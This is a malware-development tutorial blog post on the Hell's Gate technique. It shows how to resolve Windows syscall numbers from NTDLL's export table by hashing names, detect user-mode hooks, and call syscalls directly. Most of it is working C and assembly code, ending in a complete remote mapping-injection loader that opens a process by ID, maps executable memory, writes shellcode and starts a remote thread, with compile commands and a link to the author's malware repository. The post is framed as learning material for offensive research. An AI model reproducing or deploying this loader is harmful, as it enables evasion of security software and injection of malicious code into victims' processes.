# Hell's Gate

You probably have seen how to perform a direct/indirect system call. First we get a handle to NTDLL, then we get the address to our desired function (or any other func) and then we read it's code to get the SSN and the address of the `syscall` and finally use it to directly perform the syscall.&#x20;

`Hell's Gate` is just a way to dynamically retrieve the SSN and do the heavy lifting for us so that we can just call the function and perform the `syscall`.&#x20;

I'll refer to the pdf [here](https://github.com/vxunderground/VXUG-Papers/blob/main/Hells%20Gate/HellsGate.pdf) since the pdf on their [github](https://github.com/am0nsec/HellsGate) wasn't being rendered on the browser for whatever reason.&#x20;

## Explanation

Here's the important details in the code, firstly they use a structure `_VX_TABLE` to maintain a list of APIs to use and another structure `_VX_TABLE_ENTRY` to maintain the details regarding that API.

```c
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;
```

So for every API, they have a dwHash which is the `djb2` hash, a systemcall SSN, and the pAddress which will store the address of that particular function.

Here's their implementation of the `DJB2`.

```c
DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}
```

Instead of getting a handle to `NTDLL`, they take a slightly different approach, they get the `_PEB` of the current process using the `_TEB`, and from there, they find the `LDR_DATA_TABLE_ENTRY` to get to the `InMemoryOrderModuleList` and eventually get to `NTDLL` since that gets loaded into all of the windows process created. Here's how it looks when implemented.

```c
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

......SNIP

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;		
```

But this will only get us to the `EAT` for the `NTDLL`, we still need to get the SSN for the APIs and now comes the important part, which is to resolve the SSN dynamically.

```c
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}
```

So from the `EAT`, they get the 3 structures, `AddressOfFunctions`, `AddressOfNames`, and `AddressOfNameOrdinals`. The name is hashed using their `DJB2` and then compared with the APIs hash, and if it matches, then the address is saved and before saving the SSN, they perform a check to identify any possible hooks being present. This is done by comparing each of the bytes of the function prologue, until the desired opcodes are met, else they continue the loop until the `ret` is reached.

They setup the necessary functions and initialize the APIs accordingly, and then call the `Payload` function which does the injection.

```c
	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Payload(&Table);
```

Finally, they use this assembly to perform the system call.

```asm
; Hell's Gate
; Dynamic system call invocation
;
; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)

.data
	wSystemCall DWORD 000h

.code
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall
		syscall
		ret
	HellDescent ENDP
end
```

The `HellsGate` function sets the SSN accordingly and the `HellDescent` function is used to perform the system call.

```c
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(shellcode);
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Write Memory
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	// Change page permissions
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, &Timeout);
```

Another interesting thing that I found here is that if a function is defined using the `extern` keyword, the compiler won't perform other checks which it does for a generic function. The only thing that matters here is the correct use of the `SSN`. The compiler will setup the arguments accordingly and when the syscall is performed, the kernel mode function can just run by fetching those arguments from the user mode.

### Hell's Gate Flow

```
[ NTDLL.DLL IN MEMORY ]
       |
       v
[ Export Address Table (EAT) ]
       |
       +--> AddressOfNames --------> [ "NtAllocateVirtualMemory", ... ]
       |                                   |
       |          ( DJB2 Hashing ) <-------+
       |                  |
       |                  v
       |          [ 0xf5bd373480... ] == [ Target Hash? ] --( YES )--+
       |                                                             |
       +--> AddressOfNameOrdinals <----------------------------------+
       |                  |
       v                  v
[ AddressOfFunctions ]--> [ 0x7FFA1234 ] (Actual Memory Address)
                                |
                                |
        /-----------------------/
        |
        v
[ PROLOGUE SCANNING LOOP ] <--- (Identifies Hooks)
___________________________________________________________________________
| Offset | Bytes             | Instruction          | Logic               |
|--------|-------------------|----------------------|---------------------|
|  +0    | 4C 8B D1          | mov r10, rcx         | <--- Check Byte 1   |
|  +3    | B8 [XX XX] 00 00  | mov eax, SSN         | <--- EXTRACT SSN!   |
|________|___________________|______________________|_____________________|
    |                                                  |
    |--> (If 0xE9 or 0xFF found) --------------------->| [ HOOK DETECTED! ]
    |    (JMP or CALL at +0)                           | Result: FAIL
    |                                                  |
    |--> (If 0xC3 found before SSN) ------------------>| [ END OF FUNC ]
         (RET reached)                                 | Result: FAIL
```

## Mapping Injection

Now that we have an idea of how hell's gate works, we will try implementing the classic Mapping Injection using it. Firstly, I want to get the hashes so I have written a small C code along with the necessary APIs to get the `DJB2` hashes for them.

```c
int main() {
    // unsigned char name[] = "NtAllocateVirtualMemory";
    // printf("[*] DJB2  %s  @--->  0x%p\n", name, djb2(name));
    unsigned char* funcs[] = { "NtMapViewOfSection", "NtCreateSection", "NtUnmapViewOfSection", "NtClose", "NtCreateThreadEx" };
    size_t sz = sizeof(funcs) / sizeof(funcs[0]);
    printf("No. Of Functions: %d\n", sz);
    printf("==================DJB2 Hashes=====================\n");
    for(size_t i=0; i<sz; i++){
        printf("%-25s ==    0x%llx\n", funcs[i], djb2(funcs[i]));
    }
    printf("==================================================\n");
    return 0;
}
```

Running it will give me the hashes.

```
No. Of Functions: 5
===================DJB2 Hashes====================
NtMapViewOfSection        ==    0xf037c7b73290c159
NtCreateSection           ==    0xf38a8f71af24371f
NtUnmapViewOfSection      ==    0x1fe784ec0bcb745c
NtClose                   ==    0xae30af6f3d64a8c
NtCreateThreadEx          ==    0x64dc7db288c5015f
==================================================
```

Now I'll update the code accordingly in the `wmain` (which I had to change back to `main` because of `NtOpenProcess` which I've explained below) and I'll get the SSN for the APIs.

<pre class="language-c"><code class="lang-c">	VX_TABLE Table = { 0 };
	Table.NtCreateSection.dwHash = 0xf38a8f71af24371f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &#x26;Table.NtCreateSection))
		return 0x1;

	Table.NtMapViewOfSection.dwHash = 0xf037c7b73290c159;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &#x26;Table.NtMapViewOfSection))
<strong>		return 0x1;
</strong>
	Table.NtUnmapViewOfSection.dwHash = 0x1fe784ec0bcb745c;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &#x26;Table.NtUnmapViewOfSection))
		return 0x1;

	Table.NtClose.dwHash = 0xae30af6f3d64a8c;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &#x26;Table.NtClose))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &#x26;Table.NtCreateThreadEx))
		return 0x1;
</code></pre>

Now I only have to work on the Payload part. I have tried looking at the docs and also I have used x64dbg to manually analyze our implementation for the MappingInjection to look at what's being passed when the Nt functions are called.

### Looking at x64dbg

#### NtCreateSection

This is the function definition from the [NtDoc](https://ntdoc.m417z.com/ntcreatesection).

```c
NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle
    );
```

I'll look into the arguments being passed when I run my own MappingInjection in x64dbg, I see this

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The below right in the image shows the arguments which would be passed, I have shown 8 which is one more than the args being passed so we will ignore the `[rsp+40]`.

* `rcx` — `*HANDLE` — pointer to the section handle
* `rdx` — `DesiredAccess` — `0xF0000F` which I can see from the `winnt.h` file equates to something like `SECTION_ALL_ACCESS` without the `SECTION_EXTEND_SIZE`.
* `r8` — `*ObjectAttributes` — `NULL`
* `r9` — `*LARGE_INTEGER` — which is the size of our shellcode, I'll show this below.
* `[rsp+28]` — `SectionPageProtection` — `0x40` which [translates](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga) to `PAGE_EXECUTE_READWRITE`
* `[rsp+30]` — `AllocationAttributes` — `0x8000000` — which translates to `SEC_COMMIT` from the `winnt.h` file
* `[rsp+38]` — `FileHandle` — `NULL`

Now the reason why we have some space and not directly on `[rsp+4]` is because we have to allocate some shadow space and also it should be 16-bit aligned so in our case, we have given `0x20` which is 32.

Now for the r9, we know that it's a pointer, so if I try to look what's located at the address, i see the hex `0x146` which is 326 and that's the size of our shellcode.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

So we have all the things required for calling the `NtCreateSection`.&#x20;

#### NtMapViewOfSection

Here's how the NtMapViewOfSection looks like, there are 10 arguments being passed.&#x20;

```c
NTSYSCALLAPI
NTSTATUS
NTAPI
NtMapViewOfSection(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ SECTION_INHERIT InheritDisposition,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection
    );
```

Now again looking at x64dbg, I see this

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* `rcx` — `SectionHandle`
* `rdx` — `ProcessHandle` — `0xFFFFFFFF` — CurrentProcess
* `r8` — `*BaseAddress` — pointing to `NULL` in most cases just like now.
* `r9` — `ZeroBits` — 0
* `[rsp+20]` — `CommitSize` — 0
* `[rsp+28]` — `SectionOffset` — 0
* \[rsp+30] — `ViewSize` — pointer to variable which has the size of our shellcode
* \[rsp+38] — `InheritDisposition` — 1 (`ViewShare`)
* \[rsp+40] — `AllocationType` — `NULL`
* \[rsp+48] — `PageProtection` — `0x40` aka `PAGE_EXECUTE_READWRITE`

For the `InheritDisposition` , I don't think we need it, so I'll set it to `ViewUnmap` which is 2 instead.&#x20;

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Alright, so that's how we can derive the arguments which we require to perform the remote mapping injection using the NtAPI. I won't showcase the 2nd `MapViewOfFile2` command so you can try it on your own (please do let me know if you find any issues/doubts).&#x20;

### Payload

Coming back to Hells gate. Now that we have the things we require, we can right our code to perform remote mapping injection.

> Note that I had to change the `wmain` to `main` since I was using `NtOpenProcess` and taking the pid as an argument, It wasn't actually converting the `argv[1]` correctly which was causing me issues.

I'll use NtOpenProcess to get the handle to remote process

```c
	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
	status = HellDescent(&hProcess, PROCESS_ALL_ACCESS, &oAttrib, &cid);
	if(status != 0) {
	    warn("Error Opening Process Handle: 0x%lx", status);
		exit(-1);
	}
```

And then the usual MappingInjection

```c
	HellsGate(pVxTable->NtCreateSection.wSystemCall);
	status = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &maxSz, PAGE_EXECUTE_READWRITE, (SEC_COMMIT), NULL);
	if(status != 0) {
	    warn("Error Creating Section: 0x%lx", status);
		exit(-1);
	}
	okay("Created Section!");

	HellsGate(pVxTable->NtMapViewOfSection.wSystemCall);
	status = HellDescent(hSection, (HANDLE)-1, &localAddr, NULL, NULL, NULL, &ViewSize, ViewUnmap, NULL, PAGE_READWRITE);
	if(status != 0) {
	    warn("Error Mapping to Section: 0x%lx", status);
		exit(-1);
	}
	okay("Memory Mapped  @-- 0x%p", localAddr);

	VxMoveMemory(localAddr, shellcode, sizeof(shellcode));
	okay("Wrote Shellcode to Memory! ");

	HellsGate(pVxTable->NtMapViewOfSection.wSystemCall);
	status = HellDescent(hSection, hProcess, &remoteAddr, NULL, NULL, NULL, &ViewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
	if(status != 0) {
	    warn("Error Mapping to Remote Section: 0x%lx", status);
		exit(-1);
	}
	okay("Mapped to Remote Process  @-- 0x%p", remoteAddr);
	getchar();

	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, FALSE, NULL, NULL, NULL, NULL);
	if(status != 0) {
	    warn("Error Creating Thread: 0x%lx", status);
		exit(-1);
	}
	okay("Created Remote Thread @--%lx", GetThreadId(hThread));

	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hThread, FALSE, 3000);

	HellsGate(pVxTable->NtUnmapViewOfSection.wSystemCall);
	status = HellDescent((HANDLE)-1, localAddr);
	if(status != 0) warn("Error unmapping the section: 0x%lx", status);

	HellsGate(pVxTable->NtClose.wSystemCall);
	HellDescent(hSection);HellDescent(hProcess);HellDescent(hThread);
```

## Performing Hell's Gate

Finally I'll compile it, I'll also need to give the hellsgate.obj file generated from the asm and I have `nasm` so I asked gpt to convert the hellsgates.asm to nasm and this is what I got.

```asm
; nasm gates.asm -o hellsgates.obj -f win64

SECTION .data
    wSystemCall dd 0         ; 'dd' is used for a 32-bit DWORD in NASM

SECTION .text
    global HellsGate         ; Export the functions so GCC can see them
    global HellDescent

HellsGate:
    mov [rel wSystemCall], ecx   ; Store the SSN passed from C (ecx)
    ret

HellDescent:
    mov r10, rcx                 ; Move 1st arg to r10 (standard syscall requirement)
    mov eax, [rel wSystemCall]   ; Load the SSN into eax
    syscall                      ; Execute the kernel transition
    ret
```

And then I'll just compile and run the program, I had forgot to change the name while taking the screenshot and that's why it's named test lol.

```powershell
> gcc test.c hellsgates.obj -o test
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## Conclusion

It was satisfying to finally see it running, that's it for now, thanks :) Once again, I have uploaded the full source code on my [github](https://github.com/ZzN1NJ4/Malware-Development/blob/main/Hells%20Gate/main.c), so do check that out if required.

## References

* [https://github.com/am0nsec/HellsGate](https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c)
* [https://github.com/vxunderground/VXUG-Papers/blob/main/Hells%20Gate/HellsGate.pdf](https://github.com/vxunderground/VXUG-Papers/blob/main/Hells%20Gate/HellsGate.pdf)
* [https://ntdoc.m417z.com/ntcreatesection](https://ntdoc.m417z.com/ntcreatesection)
* [https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection)
* [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-createfilemappingw#return-value](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-createfilemappingw#return-value)
* [https://www.lomont.org/papers/2009/Introduction\_to\_x64\_Assembly.pdf](https://www.lomont.org/papers/2009/Introduction_to_x64_Assembly.pdf)
* [https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly](https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly)





